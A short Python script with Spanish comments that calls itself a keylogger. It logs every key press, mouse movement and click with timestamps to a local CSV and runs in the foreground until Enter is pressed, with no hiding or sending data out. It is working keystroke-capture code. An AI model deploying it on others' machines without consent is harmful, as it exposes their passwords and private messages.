import pandas as pd
from pynput import keyboard, mouse
from datetime import datetime
import os

filename = "keylogger_data.csv"
if os.path.isfile(filename):
    # Si el archivo ya existe, agregar un número al final del nombre del archivo
    base_filename, file_extension = os.path.splitext(filename)
    i = 1
    while os.path.isfile(f"{base_filename}_{i}{file_extension}"):
        i += 1
    filename = f"{base_filename}_{i}{file_extension}"

# Creamos un DataFrame vacío para almacenar los datos
columns = ['Timestamp', 'Action', 'Key']
df = pd.DataFrame(columns=columns)

def saveDataset():
    global df
    global filename
    print(df)
    df.to_csv(filename, index=False)

def on_keyboard_press(key):
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = str(key)
        action = 'Key pressed'
    except Exception as e:
        print(f"Error getting char: {e}")

    
    new_input = pd.DataFrame([[current_time, action, char]], columns=columns)
    global df
    df = pd.concat([df, new_input], ignore_index=True)
    saveDataset()

def on_mouse_move(x, y):
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    action = 'Mouse Move'
    char = f'({x}, {y})'
    
    new_input = pd.DataFrame([[current_time, action, char]], columns=columns)
    global df
    df = pd.concat([df, new_input], ignore_index=True)
    saveDataset()

def on_mouse_click(x, y, button, pressed):
    now = datetime.now()
    current_time = now.strftime("%Y-%m-%d %H:%M:%S")
    if pressed:
        action = f'Mouse Click ({button}) Pressed'
    else:
        action = f'Mouse Click ({button}) Released'
    
    char = f'({x}, {y})'
    
    new_input = pd.DataFrame([[current_time, action, char]], columns=columns)
    global df
    df = pd.concat([df, new_input], ignore_index=True)
    saveDataset()

if __name__ == "__main__":
    # Escuchando eventos del teclado
    keyboard_listener = keyboard.Listener(on_press=on_keyboard_press)
    keyboard_listener.start()

    # Escuchando eventos del mouse
    mouse_listener = mouse.Listener(on_move=on_mouse_move, on_click=on_mouse_click)
    mouse_listener.start()

    input("Presiona Enter para detener el keylogger...\n")
